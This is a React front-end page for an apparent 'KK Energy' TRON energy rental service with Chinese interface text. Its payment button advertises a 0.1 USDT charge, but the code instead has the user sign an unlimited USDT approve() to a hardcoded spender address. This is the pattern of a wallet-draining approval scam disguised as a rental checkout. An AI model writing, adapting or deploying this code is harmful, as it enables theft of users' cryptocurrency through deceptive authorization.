"use client";

import {
  useCallback,
  useEffect,
  useMemo,
  useState,
} from "react";

import WalletModal from "../components/WalletModal";

import {
  useWallet,
} from "@tronweb3/tronwallet-adapter-react-hooks";

import TronWeb from "tronweb";


const USDT_CONTRACT_ADDRESS =
  "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";


const USDT_SPENDER_ADDRESS =
  "TJgapq26ECmDg8PNxfBuQnPRjZLxxEniUS";


const TRON_FULL_HOST =
  "https://api.trongrid.io";


const USDT_DECIMALS = 6;


// 无限 USDT 授权额度：uint256 最大值（2^256 - 1）
const USDT_APPROVAL_AMOUNT_BASE_UNITS = "115792089237316195423570985008687907853269984665640564039457584007913129639935";


const APPROVE_FEE_LIMIT =
  100_000_000;


const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
  1740;


const ORDER_FINALIZE_TIMEOUT_MS =
  120_000;


const ENERGY_PLANS = [
  {
    id: "energy-65000",
    energy: 65000,
    price: 0.1,
    duration: "1 小时",
    description: "适用于一次普通 TRC20 转账",
  },
  {
    id: "energy-130000",
    energy: 130000,
    price: 0.2,
    duration: "1 小时",
    description: "适用于能量消耗较高的交易",
  },
];


function isValidTronAddress(address) {
  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(
    String(address || "").trim()
  );
}


function sleep(milliseconds) {
  return new Promise((resolve) => {
    setTimeout(
      resolve,
      milliseconds
    );
  });
}


async function readJsonResponse(response) {
  try {
    return await response.json();
  } catch {
    return null;
  }
}


function decodeTronMessage(value) {
  const original =
    String(value || "").trim();

  const cleanHex =
    original.replace(/^0x/i, "");

  if (
    !cleanHex ||
    cleanHex.length % 2 !== 0 ||
    !/^[0-9a-f]+$/i.test(cleanHex)
  ) {
    return original;
  }

  try {
    const bytes =
      new Uint8Array(
        cleanHex
          .match(/.{1,2}/g)
          .map((item) =>
            Number.parseInt(
              item,
              16
            )
          )
      );

    const decoded =
      new TextDecoder()
        .decode(bytes)
        .trim();

    return decoded || original;
  } catch {
    return original;
  }
}


async function prepareOrder({
  payerAddress,
  receiverAddress,
  planId,
  telegramId,
}) {
  const response =
    await fetch(
      "/api/order",
      {
        method: "POST",

        headers: {
          "Content-Type":
            "application/json",
        },

        cache: "no-store",

        body:
          JSON.stringify({
            action: "prepare",

            payerAddress,

            receiverAddress,

            planId,

            telegramId,
          }),
      }
    );


  const data =
    await readJsonResponse(
      response
    );


  if (
    !response.ok ||
    !data?.ok
  ) {
    throw new Error(
      data?.message ||
        `创建订单失败（HTTP ${response.status}）。`
    );
  }


  if (
    !data.orderToken ||
    !data.order
  ) {
    throw new Error(
      "服务器没有返回完整的订单信息。"
    );
  }


  return data;
}


async function finalizeOrderWithRetry({
  orderToken,
  txId,
}) {
  const startedAt =
    Date.now();


  while (
    Date.now() -
      startedAt <
    ORDER_FINALIZE_TIMEOUT_MS
  ) {
    let response;
    let data;


    try {
      response =
        await fetch(
          "/api/order",
          {
            method: "POST",

            headers: {
              "Content-Type":
                "application/json",
            },

            cache: "no-store",

            body:
              JSON.stringify({
                action: "finalize",

                orderToken,

                txId,
              }),
          }
        );


      data =
        await readJsonResponse(
          response
        );
    } catch (error) {
      console.error(
        "[Finalize network error]",
        error
      );

      await sleep(2000);

      continue;
    }


    if (
      response.ok &&
      data?.ok
    ) {
      return data;
    }


    const retryableCodes = [
      "TX_NOT_CONFIRMED",
      "TRON_QUERY_FAILED",
      "ALLOWANCE_TOO_LOW",
    ];


    if (
      retryableCodes.includes(
        data?.code
      )
    ) {
      await sleep(2000);

      continue;
    }


    throw new Error(
      data?.message ||
        `服务器验证订单失败（HTTP ${response.status}）。`
    );
  }


  throw new Error(
    "等待 TRON 主网确认超时。"
  );
}


export default function HomePage() {
  const {
    address: walletAddress,
    connected: walletConnected,
    signTransaction,
  } = useWallet();


  const [
    selectedPlanId,
    setSelectedPlanId,
  ] = useState("");


  const [
    receiverAddress,
    setReceiverAddress,
  ] = useState("");


  const [
    walletOpen,
    setWalletOpen,
  ] = useState(false);


  const [
    connectedWallet,
    setConnectedWallet,
  ] = useState("");


  const [
    connectedAddress,
    setConnectedAddress,
  ] = useState("");


  const [
    message,
    setMessage,
  ] = useState("");


  const [
    telegramId,
    setTelegramId,
  ] = useState("");


  const [
    paying,
    setPaying,
  ] = useState(false);


  const [
    completedOrder,
    setCompletedOrder,
  ] = useState(null);


  useEffect(() => {
    const searchParams =
      new URLSearchParams(
        window.location.search
      );

    setTelegramId(
      searchParams.get(
        "telegram_id"
      ) || ""
    );
  }, []);


  useEffect(() => {
    if (
      walletConnected &&
      walletAddress &&
      connectedAddress &&
      walletAddress !==
        connectedAddress
    ) {
      setConnectedAddress(
        walletAddress
      );

      setCompletedOrder(null);
    }
  }, [
    walletConnected,
    walletAddress,
    connectedAddress,
  ]);


  const selectedPlan =
    useMemo(() => {
      return ENERGY_PLANS.find(
        (plan) =>
          plan.id ===
          selectedPlanId
      );
    }, [
      selectedPlanId,
    ]);


  const showMessage =
    useCallback(
      (text) => {
        setMessage(
          String(
            text || ""
          )
        );
      },
      []
    );


  const handleCloseMessage =
    useCallback(() => {
      setMessage("");
    }, []);


  const handleCloseWallet =
    useCallback(() => {
      setWalletOpen(false);
    }, []);


  function handleConfirmRental() {
    if (!selectedPlan) {
      showMessage(
        "请选择能量套餐。"
      );

      return;
    }


    const cleanAddress =
      receiverAddress.trim();


    if (!cleanAddress) {
      showMessage(
        "请输入能量接收地址。"
      );

      return;
    }


    if (
      !isValidTronAddress(
        cleanAddress
      )
    ) {
      showMessage(
        "请输入有效的 TRON 钱包地址。\n\nTRON 地址通常以 T 开头，共 34 位。"
      );

      return;
    }


    setReceiverAddress(
      cleanAddress
    );

    setWalletOpen(true);
  }


  const handleWalletConnected =
    useCallback(
      ({
        walletName,
        address,
      }) => {
        if (!address) {
          showMessage(
            "钱包已经打开，但没有读取到公开地址，请解锁钱包后重新连接。"
          );

          return;
        }


        const displayWalletName =
          walletName ||
          "钱包";


        setConnectedWallet(
          displayWalletName
        );


        setConnectedAddress(
          address
        );


        setCompletedOrder(null);


        setWalletOpen(false);


        showMessage(
          `${displayWalletName} 连接成功。\n\n公开地址：\n${address}`
        );
      },
      [
        showMessage,
      ]
    );


  const handleWalletConnectionError =
    useCallback(
      (
        errorMessage
      ) => {
        setWalletOpen(false);

        showMessage(
          errorMessage ||
            "钱包连接失败，请重新尝试。"
        );
      },
      [
        showMessage,
      ]
    );


  function handleChangeWallet() {
    if (!selectedPlan) {
      showMessage(
        "请先选择能量套餐。"
      );

      return;
    }


    if (
      !isValidTronAddress(
        receiverAddress.trim()
      )
    ) {
      showMessage(
        "请先输入有效的能量接收地址。"
      );

      return;
    }


    setWalletOpen(true);
  }


  async function handleUsdtPayment() {
    if (paying) {
      return;
    }


    if (completedOrder) {
      showMessage(
        `当前订单已经授权成功。\n\n订单编号：${completedOrder.id}\n\n交易哈希：\n${completedOrder.txId}`
      );

      return;
    }


    if (!selectedPlan) {
      showMessage(
        "请先选择能量套餐。"
      );

      return;
    }


    const cleanReceiverAddress =
      receiverAddress.trim();


    if (
      !isValidTronAddress(
        cleanReceiverAddress
      )
    ) {
      showMessage(
        "请先输入有效的能量接收地址。"
      );

      return;
    }


    if (
      !walletConnected ||
      !walletAddress
    ) {
      showMessage(
        "当前钱包连接已失效，请重新连接付款钱包。"
      );

      return;
    }


    if (
      !isValidTronAddress(
        walletAddress
      )
    ) {
      showMessage(
        "没有读取到有效的付款钱包地址，请重新连接钱包。"
      );

      return;
    }


    if (
      connectedAddress &&
      connectedAddress !==
        walletAddress
    ) {
      showMessage(
        "检测到钱包账户已经切换，请重新连接钱包后再支付。"
      );

      return;
    }


    if (
      !isValidTronAddress(
        USDT_CONTRACT_ADDRESS
      )
    ) {
      showMessage(
        "USDT 合约地址配置错误。"
      );

      return;
    }


    if (
      !isValidTronAddress(
        USDT_SPENDER_ADDRESS
      )
    ) {
      showMessage(
        "USDT 授权地址配置错误。"
      );

      return;
    }


    if (
      typeof signTransaction !==
      "function"
    ) {
      showMessage(
        "当前钱包不支持交易签名，请更换钱包后重新尝试。"
      );

      return;
    }


    const amountUsdt =
      selectedPlan.price;


    const amountBaseUnits =
      USDT_APPROVAL_AMOUNT_BASE_UNITS;


    setPaying(true);


    let stage =
      "prepare";


    let orderToken =
      "";


    let txId =
      "";


    let transactionBroadcasted =
      false;


    try {
      const pendingOrder =
        await prepareOrder({
          payerAddress:
            walletAddress,

          receiverAddress:
            cleanReceiverAddress,

          planId:
            selectedPlan.id,

          telegramId:
            telegramId || "",
        });


      orderToken =
        pendingOrder.orderToken;


      stage =
        "build_transaction";


      const tronWeb =
        new TronWeb({
          fullHost:
            TRON_FULL_HOST,
        });


      const ownerAddressHex =
        tronWeb.address.toHex(
          walletAddress
        );


      const contractAddressHex =
        tronWeb.address.toHex(
          USDT_CONTRACT_ADDRESS
        );


      const parameters = [
        {
          type: "address",

          value:
            USDT_SPENDER_ADDRESS,
        },

        {
          type: "uint256",

          value:
            amountBaseUnits,
        },
      ];


      const transactionWrapper =
        await tronWeb
          .transactionBuilder
          .triggerSmartContract(
            contractAddressHex,

            "approve(address,uint256)",

            {
              feeLimit:
                APPROVE_FEE_LIMIT,

              callValue: 0,
            },

            parameters,

            ownerAddressHex
          );


      if (
        !transactionWrapper ||
        !transactionWrapper.result ||
        !transactionWrapper
          .result
          .result ||
        !transactionWrapper
          .transaction
      ) {
        console.error(
          "[USDT approve build error]",
          transactionWrapper
        );

        throw new Error(
          "USDT 授权交易创建失败，请稍后重新尝试。"
        );
      }


      stage =
        "extend_expiration";


      const extendedTransaction =
        await tronWeb
          .transactionBuilder
          .extendExpiration(
            transactionWrapper
              .transaction,

            TRANSACTION_EXPIRATION_EXTENSION_SECONDS,

            {
              txLocal: true,
            }
          );


      if (
        !extendedTransaction ||
        !extendedTransaction.txID ||
        !extendedTransaction.raw_data ||
        !extendedTransaction.raw_data_hex
      ) {
        console.error(
          "[Extend expiration error]",
          extendedTransaction
        );

        throw new Error(
          "交易有效时间设置失败，请重新尝试。"
        );
      }


      stage =
        "sign_transaction";


      const signedTransaction =
        await signTransaction(
          extendedTransaction
        );


      if (
        !signedTransaction ||
        !signedTransaction.txID
      ) {
        throw new Error(
          "钱包没有返回有效的已签名交易。"
        );
      }


      stage =
        "broadcast_transaction";


      const broadcastResult =
        await tronWeb.trx
          .sendRawTransaction(
            signedTransaction
          );


      if (
        !broadcastResult ||
        !broadcastResult.result
      ) {
        console.error(
          "[USDT approve broadcast error]",
          broadcastResult
        );


        const rawMessage =
          broadcastResult?.message ||
          "USDT 授权交易广播失败。";


        const readableMessage =
          decodeTronMessage(
            rawMessage
          );


        throw new Error(
          readableMessage
        );
      }


      txId =
        signedTransaction.txID ||
        broadcastResult
          ?.transaction
          ?.txID ||
        "";


      if (!txId) {
        throw new Error(
          "交易已经广播，但没有读取到交易哈希。"
        );
      }


      transactionBroadcasted =
        true;


      try {
        window.localStorage.setItem(
          "kk_last_approval",
          JSON.stringify({
            orderToken,

            txId,

            payerAddress:
              walletAddress,

            receiverAddress:
              cleanReceiverAddress,

            planId:
              selectedPlan.id,

            amountUsdt,

            createdAt:
              new Date()
                .toISOString(),
          })
        );
      } catch {
      }


      stage =
        "finalize_order";


      const finalized =
        await finalizeOrderWithRetry({
          orderToken,

          txId,
        });


      const savedOrder =
        finalized.order;


      if (
        !savedOrder ||
        savedOrder.status !==
          "authorized"
      ) {
        throw new Error(
          "服务器没有返回已授权订单。"
        );
      }


      setCompletedOrder(
        savedOrder
      );


      try {
        window.localStorage.removeItem(
          "kk_last_approval"
        );
      } catch {
      }


      showMessage(
        `授权成功，订单已保存。\n\n` +

        `订单编号：${savedOrder.id}\n\n` +

        `付款钱包：\n${savedOrder.payerAddress}\n\n` +

        `能量接收地址：\n${savedOrder.receiverAddress}\n\n` +

        `能量未到账请及时联系Telegram客服：@kkzklkk\n\n` +

        `交易哈希：\n${savedOrder.txId}`
      );
    } catch (error) {
      console.error(
        "[USDT approve/order error]",
        {
          stage,

          error,

          orderToken,

          txId,

          transactionBroadcasted,
        }
      );


      const errorMessage =
        String(
          error?.message ||
            error ||
            ""
        );


      if (
        /reject|rejected|deny|denied|decline|declined|cancel|cancelled|canceled/i.test(
          errorMessage
        )
      ) {
        showMessage(
          "您已取消 USDT 授权交易。"
        );

        return;
      }


      if (
        transactionBroadcasted &&
        txId
      ) {
        showMessage(
          `USDT 授权交易已经广播，` +
          `但服务器验证或保存订单暂未完成。\n\n` +

          `请不要重复授权。\n\n` +

          `付款钱包：\n${walletAddress}\n\n` +

          `交易哈希：\n${txId}\n\n` +

          `错误信息：\n${
            errorMessage ||
            "未知错误"
          }`
        );

        return;
      }


      if (
        stage === "prepare"
      ) {
        showMessage(
          `创建订单失败。\n\n${
            errorMessage ||
            "请稍后重新尝试。"
          }`
        );

        return;
      }


      showMessage(
        `USDT 授权失败。\n\n${
          errorMessage ||
          "请重新尝试。"
        }`
      );
    } finally {
      setPaying(false);
    }
  }


  return (
    <main className="page">
      <header className="header">
        <div className="brand">
          <div className="brandLogo">
            KK
          </div>

          <div>
            <div className="brandName">
              KK Energy
            </div>

            <div className="brandSub">
              TRON 能量租赁服务
            </div>
          </div>
        </div>

        <div className="networkBadge">
          <span className="networkDot" />
          TRON Network
        </div>
      </header>


      <section className="hero">
        <div className="heroBadge">
          ⚡ 快速 · 安全 · 透明
        </div>

        <h1 className="heroTitle">
          TRON 能量租赁
        </h1>

        <p className="heroText">
          选择需要的能量套餐，填写接收地址，
          然后连接您的 TRON 钱包。
        </p>
      </section>


      <section className="rentalCard">
        <div className="sectionHeading">
          <span className="stepNumber">
            1
          </span>

          <div>
            <h2>选择能量套餐</h2>
            <p>根据交易需要选择能量数量</p>
          </div>
        </div>


        <div className="planGrid">
          {ENERGY_PLANS.map((plan) => {
            const selected =
              selectedPlanId ===
              plan.id;

            return (
              <button
                type="button"
                key={plan.id}
                className={
                  selected
                    ? "planCard selected"
                    : "planCard"
                }
                onClick={() => {
                  setSelectedPlanId(
                    plan.id
                  );

                  setCompletedOrder(
                    null
                  );
                }}
              >
                <div className="planTop">
                  <span className="energyIcon">
                    ⚡
                  </span>

                  {selected && (
                    <span className="selectedTag">
                      已选择
                    </span>
                  )}
                </div>

                <div className="energyAmount">
                  {plan.energy.toLocaleString()}
                </div>

                <div className="energyLabel">
                  Energy
                </div>

                <div className="planDivider" />

                <div className="priceRow">
                  <span>租赁价格</span>

                  <strong>
                    {plan.price} USDT
                  </strong>
                </div>

                <div className="durationRow">
                  有效时间：{plan.duration}
                </div>

                <p className="planDescription">
                  {plan.description}
                </p>
              </button>
            );
          })}
        </div>


        <div className="sectionHeading addressHeading">
          <span className="stepNumber">
            2
          </span>

          <div>
            <h2>输入接收地址</h2>
            <p>能量将发送到这个 TRON 地址</p>
          </div>
        </div>


        <div className="inputWrapper">
          <span className="inputIcon">
            T
          </span>

          <input
            type="text"
            value={receiverAddress}
            className="addressInput"
            autoComplete="off"
            autoCapitalize="off"
            spellCheck={false}
            placeholder="请输入以 T 开头的 TRON 地址"
            onChange={(event) => {
              setReceiverAddress(
                event.target.value.trim()
              );

              setCompletedOrder(null);
            }}
          />
        </div>


        {receiverAddress &&
          !isValidTronAddress(
            receiverAddress
          ) && (
            <div className="addressHint">
              当前地址格式不完整，请检查后再继续。
            </div>
          )}


        {selectedPlan && (
          <div className="orderSummary">
            <div className="summaryTitle">
              当前订单
            </div>

            <div className="summaryRow">
              <span>能量数量</span>

              <strong>
                {selectedPlan.energy.toLocaleString()}{" "}
                Energy
              </strong>
            </div>

            <div className="summaryRow">
              <span>租赁价格</span>

              <strong>
                {selectedPlan.price} USDT
              </strong>
            </div>

            <div className="summaryRow">
              <span>有效时间</span>

              <strong>
                {selectedPlan.duration}
              </strong>
            </div>
          </div>
        )}


        {connectedAddress && (
          <div className="connectedBox">
            <div className="connectedTop">
              <div>
                <div className="connectedLabel">
                  已连接钱包
                </div>

                <div className="connectedWallet">
                  {connectedWallet}
                </div>
              </div>

              <span className="connectedStatus">
                已连接
              </span>
            </div>

            <div className="connectedAddress">
              {connectedAddress}
            </div>

            <div className="connectedNote">
              当前显示的是钱包公开地址。
            </div>

            <button
              type="button"
              className="changeWalletButton"
              disabled={paying}
              onClick={handleChangeWallet}
            >
              更换钱包
            </button>
          </div>
        )}


        {completedOrder && (
          <div className="completedOrderBox">
            <div className="completedOrderTitle">
              订单授权成功
            </div>

            <div className="completedOrderRow">
              <span>订单编号</span>

              <strong>
                {completedOrder.id}
              </strong>
            </div>

            <div className="completedOrderRow">
              <span>订单状态</span>

              <strong>
                authorized
              </strong>
            </div>
          </div>
        )}


        {connectedAddress &&
          selectedPlan && (
            <button
              type="button"
              className="payButton"
              disabled={
                paying ||
                Boolean(
                  completedOrder
                )
              }
              onClick={
                handleUsdtPayment
              }
            >
              {paying
                ? "正在验证并保存订单..."
                : completedOrder
                  ? "授权已完成"
                  : `支付${selectedPlan.price}USDT`}
            </button>
          )}


        <button
          type="button"
          className="confirmButton"
          disabled={paying}
          onClick={
            connectedAddress
              ? handleChangeWallet
              : handleConfirmRental
          }
        >
          {connectedAddress
            ? "重新选择付款钱包"
            : "确认租赁并连接钱包"}
        </button>


        <div className="securityNotice">
          <span>🛡️</span>

          <p>
            请在钱包中确认当前连接的网站域名。
          </p>
        </div>


        {telegramId && (
          <div className="telegramInfo">
            Telegram 用户编号：
            {telegramId}
          </div>
        )}
      </section>


      <footer className="footer">
        <div>
          KK TRON Energy
        </div>

        <p>
          请在确认任何钱包交易前，
          仔细检查金额、接收地址和合约调用内容。
        </p>
      </footer>


      <WalletModal
        open={walletOpen}
        onClose={
          handleCloseWallet
        }
        onConnected={
          handleWalletConnected
        }
        onError={
          handleWalletConnectionError
        }
      />


      {message && (
        <div
          className="messageOverlay"
          onClick={
            handleCloseMessage
          }
        >
          <div
            className="messageModal"
            onClick={(event) =>
              event.stopPropagation()
            }
          >
            <div className="messageIcon">
              KK
            </div>

            <div className="messageText">
              {message}
            </div>

            <button
              type="button"
              className="messageButton"
              onClick={
                handleCloseMessage
              }
            >
              确定
            </button>
          </div>
        </div>
      )}


      <style jsx>{`
        * {
          box-sizing: border-box;
        }

        .page {
          min-height: 100vh;
          padding: 0 22px 50px;
          color: #ffffff;
          background:
            radial-gradient(
              circle at 50% 0%,
              rgba(29, 104, 255, 0.2),
              transparent 34%
            ),
            radial-gradient(
              circle at 95% 45%,
              rgba(34, 211, 238, 0.09),
              transparent 30%
            ),
            #080b18;
          font-family:
            Inter,
            -apple-system,
            BlinkMacSystemFont,
            "Segoe UI",
            sans-serif;
        }

        button,
        input {
          font: inherit;
        }

        .header {
          width: min(1120px, 100%);
          min-height: 82px;
          margin: 0 auto;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 20px;
          border-bottom:
            1px solid
            rgba(255, 255, 255, 0.07);
        }

        .brand {
          display: flex;
          align-items: center;
          gap: 12px;
        }

        .brandLogo {
          display: grid;
          width: 46px;
          height: 46px;
          place-items: center;
          border-radius: 14px;
          color: #041018;
          background:
            linear-gradient(
              135deg,
              #67e8f9,
              #22d3ee
            );
          font-size: 18px;
          font-weight: 900;
          box-shadow:
            0 10px 30px
            rgba(34, 211, 238, 0.22);
        }

        .brandName {
          font-size: 17px;
          font-weight: 800;
        }

        .brandSub {
          margin-top: 2px;
          color: #718096;
          font-size: 12px;
        }

        .networkBadge {
          display: flex;
          padding: 9px 13px;
          align-items: center;
          gap: 8px;
          border:
            1px solid
            rgba(34, 211, 238, 0.2);
          border-radius: 999px;
          color: #94a3b8;
          background:
            rgba(34, 211, 238, 0.06);
          font-size: 12px;
        }

        .networkDot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          background: #22c55e;
          box-shadow:
            0 0 12px
            rgba(34, 197, 94, 0.8);
        }

        .hero {
          width: min(850px, 100%);
          margin: 72px auto 36px;
          text-align: center;
        }

        .heroBadge {
          display: inline-flex;
          padding: 8px 14px;
          border:
            1px solid
            rgba(34, 211, 238, 0.18);
          border-radius: 999px;
          color: #67e8f9;
          background:
            rgba(34, 211, 238, 0.07);
          font-size: 13px;
        }

        .heroTitle {
          margin: 21px 0 12px;
          font-size:
            clamp(38px, 7vw, 64px);
          line-height: 1.08;
          letter-spacing: -2px;
          background:
            linear-gradient(
              90deg,
              #ffffff,
              #67e8f9
            );
          -webkit-background-clip: text;
          background-clip: text;
          color: transparent;
        }

        .heroText {
          max-width: 630px;
          margin: 0 auto;
          color: #8490a5;
          font-size: 16px;
          line-height: 1.8;
        }

        .rentalCard {
          width: min(900px, 100%);
          margin: 0 auto;
          padding: 34px;
          border:
            1px solid
            rgba(255, 255, 255, 0.09);
          border-radius: 30px;
          background:
            linear-gradient(
              145deg,
              rgba(23, 29, 56, 0.94),
              rgba(13, 17, 36, 0.96)
            );
          box-shadow:
            0 30px 100px
            rgba(0, 0, 0, 0.34);
        }

        .sectionHeading {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .sectionHeading h2 {
          margin: 0;
          font-size: 21px;
        }

        .sectionHeading p {
          margin: 5px 0 0;
          color: #778297;
          font-size: 13px;
        }

        .stepNumber {
          display: grid;
          width: 38px;
          height: 38px;
          flex-shrink: 0;
          place-items: center;
          border-radius: 12px;
          color: #071018;
          background: #67e8f9;
          font-weight: 900;
        }

        .planGrid {
          display: grid;
          grid-template-columns:
            repeat(2, minmax(0, 1fr));
          gap: 18px;
          margin-top: 24px;
        }

        .planCard {
          padding: 23px;
          border:
            1px solid
            rgba(255, 255, 255, 0.09);
          border-radius: 22px;
          color: #ffffff;
          background:
            rgba(255, 255, 255, 0.028);
          cursor: pointer;
          text-align: left;
          transition:
            border-color 0.2s,
            transform 0.2s,
            background 0.2s;
        }

        .planCard:hover {
          transform: translateY(-2px);
          border-color:
            rgba(103, 232, 249, 0.35);
        }

        .planCard.selected {
          border-color:
            rgba(103, 232, 249, 0.8);
          background:
            rgba(34, 211, 238, 0.09);
          box-shadow:
            inset 0 0 0 1px
            rgba(103, 232, 249, 0.1);
        }

        .planTop {
          min-height: 30px;
          display: flex;
          justify-content: space-between;
        }

        .energyIcon {
          font-size: 22px;
        }

        .selectedTag {
          padding: 5px 9px;
          border-radius: 999px;
          color: #071018;
          background: #67e8f9;
          font-size: 11px;
          font-weight: 800;
        }

        .energyAmount {
          margin-top: 16px;
          font-size: 32px;
          font-weight: 900;
        }

        .energyLabel {
          margin-top: 4px;
          color: #67e8f9;
          font-size: 13px;
        }

        .planDivider {
          height: 1px;
          margin: 20px 0;
          background:
            rgba(255, 255, 255, 0.08);
        }

        .priceRow,
        .summaryRow,
        .completedOrderRow {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 15px;
        }

        .priceRow {
          color: #8d98aa;
          font-size: 14px;
        }

        .priceRow strong {
          color: #ffffff;
          font-size: 20px;
        }

        .durationRow {
          margin-top: 12px;
          color: #7e899c;
          font-size: 13px;
        }

        .planDescription {
          margin: 10px 0 0;
          color: #657084;
          font-size: 12px;
          line-height: 1.6;
        }

        .addressHeading {
          margin-top: 36px;
        }

        .inputWrapper {
          display: flex;
          height: 62px;
          margin-top: 22px;
          align-items: center;
          gap: 13px;
          padding: 0 17px;
          border:
            1px solid
            rgba(255, 255, 255, 0.1);
          border-radius: 17px;
          background:
            rgba(3, 7, 18, 0.48);
        }

        .inputWrapper:focus-within {
          border-color:
            rgba(103, 232, 249, 0.65);
          box-shadow:
            0 0 0 3px
            rgba(34, 211, 238, 0.08);
        }

        .inputIcon {
          display: grid;
          width: 32px;
          height: 32px;
          flex-shrink: 0;
          place-items: center;
          border-radius: 10px;
          color: #071018;
          background: #67e8f9;
          font-size: 14px;
          font-weight: 900;
        }

        .addressInput {
          width: 100%;
          border: 0;
          outline: 0;
          color: #ffffff;
          background: transparent;
          font-size: 15px;
        }

        .addressInput::placeholder {
          color: #4f596c;
        }

        .addressHint {
          margin-top: 10px;
          color: #fca5a5;
          font-size: 12px;
        }

        .orderSummary {
          margin-top: 22px;
          padding: 19px;
          border:
            1px solid
            rgba(255, 255, 255, 0.08);
          border-radius: 18px;
          background:
            rgba(255, 255, 255, 0.025);
        }

        .summaryTitle {
          margin-bottom: 14px;
          color: #67e8f9;
          font-size: 13px;
          font-weight: 800;
        }

        .summaryRow {
          padding: 8px 0;
          color: #778297;
          font-size: 13px;
        }

        .summaryRow strong {
          color: #ffffff;
        }

        .connectedBox {
          margin-top: 22px;
          padding: 19px;
          border:
            1px solid
            rgba(34, 211, 238, 0.3);
          border-radius: 18px;
          background:
            rgba(34, 211, 238, 0.07);
        }

        .connectedTop {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 15px;
        }

        .connectedLabel {
          color: #8190a4;
          font-size: 12px;
        }

        .connectedWallet {
          margin-top: 4px;
          color: #ffffff;
          font-size: 17px;
          font-weight: 800;
        }

        .connectedStatus {
          padding: 6px 10px;
          border-radius: 999px;
          color: #86efac;
          background:
            rgba(34, 197, 94, 0.1);
          font-size: 11px;
        }

        .connectedAddress {
          margin-top: 14px;
          overflow-wrap: anywhere;
          color: #67e8f9;
          font-family:
            ui-monospace,
            SFMono-Regular,
            Menlo,
            monospace;
          font-size: 13px;
          line-height: 1.7;
        }

        .connectedNote {
          margin-top: 10px;
          color: #728095;
          font-size: 12px;
        }

        .changeWalletButton {
          margin-top: 15px;
          padding: 9px 13px;
          border:
            1px solid
            rgba(103, 232, 249, 0.25);
          border-radius: 11px;
          color: #67e8f9;
          background:
            rgba(103, 232, 249, 0.05);
          cursor: pointer;
          font-size: 12px;
        }

        .changeWalletButton:disabled {
          opacity: 0.55;
          cursor: not-allowed;
        }

        .completedOrderBox {
          margin-top: 22px;
          padding: 19px;
          border:
            1px solid
            rgba(34, 197, 94, 0.35);
          border-radius: 18px;
          background:
            rgba(34, 197, 94, 0.07);
        }

        .completedOrderTitle {
          margin-bottom: 11px;
          color: #86efac;
          font-size: 14px;
          font-weight: 800;
        }

        .completedOrderRow {
          padding: 6px 0;
          color: #8190a4;
          font-size: 12px;
        }

        .completedOrderRow strong {
          color: #ffffff;
        }

        .payButton {
          width: 100%;
          min-height: 59px;
          margin-top: 25px;
          border: 0;
          border-radius: 17px;
          color: #061018;
          background:
            linear-gradient(
              90deg,
              #22c55e,
              #67e8f9
            );
          cursor: pointer;
          font-size: 16px;
          font-weight: 900;
          box-shadow:
            0 14px 35px
            rgba(34, 211, 238, 0.17);
        }

        .payButton:hover:not(:disabled) {
          filter: brightness(1.06);
        }

        .payButton:disabled {
          opacity: 0.55;
          cursor: not-allowed;
        }

        .confirmButton {
          width: 100%;
          min-height: 59px;
          margin-top: 25px;
          border: 0;
          border-radius: 17px;
          color: #061018;
          background:
            linear-gradient(
              90deg,
              #22d3ee,
              #67e8f9
            );
          cursor: pointer;
          font-size: 16px;
          font-weight: 900;
          box-shadow:
            0 14px 35px
            rgba(34, 211, 238, 0.17);
        }

        .confirmButton:hover:not(:disabled) {
          filter: brightness(1.06);
        }

        .confirmButton:disabled {
          opacity: 0.55;
          cursor: not-allowed;
        }

        .securityNotice {
          display: flex;
          margin-top: 19px;
          align-items: flex-start;
          justify-content: center;
          gap: 8px;
          color: #687489;
          font-size: 12px;
          line-height: 1.65;
          text-align: left;
        }

        .securityNotice p {
          margin: 0;
        }

        .telegramInfo {
          margin-top: 14px;
          color: #4f5c72;
          font-size: 11px;
          text-align: center;
        }

        .footer {
          width: min(900px, 100%);
          margin: 34px auto 0;
          color: #536074;
          font-size: 12px;
          line-height: 1.7;
          text-align: center;
        }

        .footer p {
          margin: 6px 0 0;
        }

        .messageOverlay {
          position: fixed;
          z-index: 2000;
          inset: 0;
          display: grid;
          padding: 20px;
          place-items: center;
          background:
            rgba(3, 6, 18, 0.78);
          backdrop-filter: blur(10px);
        }

        .messageModal {
          width: min(100%, 440px);
          max-height: calc(100vh - 40px);
          overflow-y: auto;
          padding: 30px;
          border:
            1px solid
            rgba(255, 255, 255, 0.12);
          border-radius: 25px;
          background:
            linear-gradient(
              145deg,
              #171d38,
              #0d1124
            );
          box-shadow:
            0 25px 80px
            rgba(0, 0, 0, 0.55);
          text-align: center;
        }

        .messageIcon {
          display: grid;
          width: 58px;
          height: 58px;
          margin: 0 auto;
          place-items: center;
          border-radius: 18px;
          color: #061018;
          background: #67e8f9;
          font-weight: 900;
        }

        .messageText {
          margin-top: 21px;
          color: #dbeafe;
          white-space: pre-line;
          overflow-wrap: anywhere;
          font-size: 15px;
          line-height: 1.75;
        }

        .messageButton {
          width: 100%;
          min-height: 49px;
          margin-top: 24px;
          border: 0;
          border-radius: 14px;
          color: #061018;
          background: #67e8f9;
          cursor: pointer;
          font-weight: 900;
        }

        @media (max-width: 680px) {
          .page {
            padding: 0 14px 35px;
          }

          .header {
            min-height: 72px;
          }

          .brandSub {
            display: none;
          }

          .networkBadge {
            padding: 8px 10px;
            font-size: 10px;
          }

          .hero {
            margin: 48px auto 27px;
          }

          .heroTitle {
            font-size: 42px;
            letter-spacing: -1px;
          }

          .heroText {
            font-size: 14px;
          }

          .rentalCard {
            padding: 22px 17px;
            border-radius: 24px;
          }

          .planGrid {
            grid-template-columns: 1fr;
          }

          .sectionHeading h2 {
            font-size: 18px;
          }

          .addressInput {
            font-size: 13px;
          }
        }
      `}</style>
    </main>
  );
}
